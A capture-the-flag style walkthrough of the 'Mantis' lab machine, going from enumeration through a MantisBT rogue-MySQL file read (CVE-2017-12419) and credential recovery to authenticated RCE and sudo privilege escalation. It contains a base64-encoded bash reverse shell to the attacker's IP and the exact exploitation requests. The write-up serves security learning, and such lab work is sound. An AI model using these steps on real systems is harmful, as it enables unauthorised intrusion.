---
icon: ubuntu
---

# Mantis - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.174.204 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 19:47 EDT
Nmap scan report for 192.168.174.204
Host is up (0.032s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Slick - Bootstrap 4 Template
3306/tcp open  mysql   MariaDB 5.5.5-10.3.34
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
|   Thread ID: 17
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSigpipes, Support41Auth, SupportsTransactions, ODBCClient, ConnectWithDatabase, Speaks41ProtocolOld, FoundRows, InteractiveClient, SupportsLoadDataLocal, LongColumnFlag, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, SupportsCompression, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: 8vk8s\Qar:j'!o/;zwdp
|_  Auth Plugin Name: mysql_native_password
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   35.67 ms 192.168.45.1
2   35.62 ms 192.168.45.254
3   35.69 ms 192.168.251.1
4   35.77 ms 192.168.174.204
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (1118).png" alt=""><figcaption></figcaption></figure>

I am going to run directory busting while doing manual enumeration

#### <mark style="color:$primary;">Feroxbuster</mark>

```
feroxbuster -u http://192.168.174.204/
```

<figure><img src="../../.gitbook/assets/image (1120).png" alt=""><figcaption></figcaption></figure>

<mark style="color:$info;">**/bugtracker**</mark> endpoint looks interesting. It takes me to a login page stating that the admin directory is a security risk.

<figure><img src="../../.gitbook/assets/image (1121).png" alt=""><figcaption></figcaption></figure>

I tried to access the <mark style="color:$info;">**/admin**</mark> panel but it didn't work. I took a look at the Github repository for this software and tried to access the other files within the admin panel, which worked: [**https://github.com/mantisbt/mantisbt**](https://github.com/mantisbt/mantisbt)

<figure><img src="../../.gitbook/assets/image (1122).png" alt=""><figcaption></figcaption></figure>

At the bottom of the page, there are options to Upgrade the SQL database, If we just click on the Install button without filling in any details, we are brought to another page

<figure><img src="../../.gitbook/assets/image (1123).png" alt=""><figcaption></figcaption></figure>

There's a configuration file mentioned towards the bottom of the page, and it also shows that the web page is able to interact with the SQL instance

### <mark style="color:$primary;">Rogue MySQL LFI -> MySQL Creds</mark>

I did a lot more reading about <mark style="color:$info;">**install.php**</mark> and the other components related to SQL of the admin panel and came across this <mark style="color:$info;">**CVE-2017-12419 Arbitrary File Read**</mark> inside install.php script

This involves using a Rogue SQL server to exploit an LFI there is one available on [**Github**](https://github.com/allyshka/Rogue-MySql-Server/blob/master/roguemysql.php) Save it into a file sql.php, and run it

<figure><img src="../../.gitbook/assets/image (1124).png" alt=""><figcaption></figcaption></figure>

Now we just have to visit <mark style="color:$info;">**`install.php?install=3&hostname=192.168.45.158`**</mark> to run it, and it works!

<figure><img src="../../.gitbook/assets/image (1125).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1126).png" alt=""><figcaption></figcaption></figure>

We can use this to read the <mark style="color:$info;">**config\_inc.php**</mark> file mentioned earlier

```
/var/www/html/bugtracker/config/config_inc.php
```

<figure><img src="../../.gitbook/assets/image (1127).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1128).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1129).png" alt=""><figcaption></figcaption></figure>

This reveals the MySQL creds!

```
root:SuperSequelPassword
```

### <mark style="color:$primary;">Enumerating MySQL</mark>

Let's connect to MySQL and see what we can find:

```
mysql -h 192.168.174.204 -u root -pSuperSequelPassword --skip-ssl
```

<figure><img src="../../.gitbook/assets/image (1130).png" alt=""><figcaption></figcaption></figure>

```
administrator:c7870d0b102cfb2f4916ff04e47b5c6f
```

<figure><img src="../../.gitbook/assets/image (1131).png" alt=""><figcaption></figcaption></figure>

Crackstation was able to crack the hash for us

```
administrator:prayingmantis
```

Ok, So the searchsploit RCE exploit did not work for me. I am going to try and exploit it manually.&#x20;

### <mark style="color:$primary;">Mantis BugTracker RCE \[Authenticated] Manual</mark>&#x20;

I am going to login as the administrator user first

<figure><img src="../../.gitbook/assets/image (1132).png" alt=""><figcaption></figcaption></figure>

Prepare a bash reverse shell and base64 encoded it

```
echo "bash -i >& /dev/tcp/192.168.45.158/80 0>&1" | base64
```

<figure><img src="../../.gitbook/assets/image (1133).png" alt=""><figcaption></figcaption></figure>

```
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE1OC84MCAwPiYxCg== | base64 -d | /bin/bash;
```

Then, head to **`/bugtracker/adm_config_report.php`** and create the following Configuration Options

<figure><img src="../../.gitbook/assets/image (1134).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1135).png" alt=""><figcaption></figcaption></figure>

Now if you visit **`/bugtracker/workflow_graph_img.php`** you will get a reverse shell. Make sure you have a listener ready on whatever port you choose!

<figure><img src="../../.gitbook/assets/image (1136).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1137).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (1140).png" alt=""><figcaption></figcaption></figure>

2 main users with shell mantis and root. I'll keep that in mind!

### <mark style="color:$primary;">Pspy</mark>

```
timeout 3m ./pspy64
```

<figure><img src="../../.gitbook/assets/image (1139).png" alt=""><figcaption></figcaption></figure>

pspy reveals a script running with a password as the mantis user! Let's see if this password works for the mantis user

<figure><img src="../../.gitbook/assets/image (1141).png" alt=""><figcaption></figcaption></figure>

It worked and the mantis user can run All comands as the root user! Easy privesc just run

### <mark style="color:$primary;">Sudo ALL</mark>

```
sudo /bin/bash
```

<figure><img src="../../.gitbook/assets/image (1142).png" alt=""><figcaption></figcaption></figure>

And now we have root! Initial access took a while on this box, but privesc was easy!
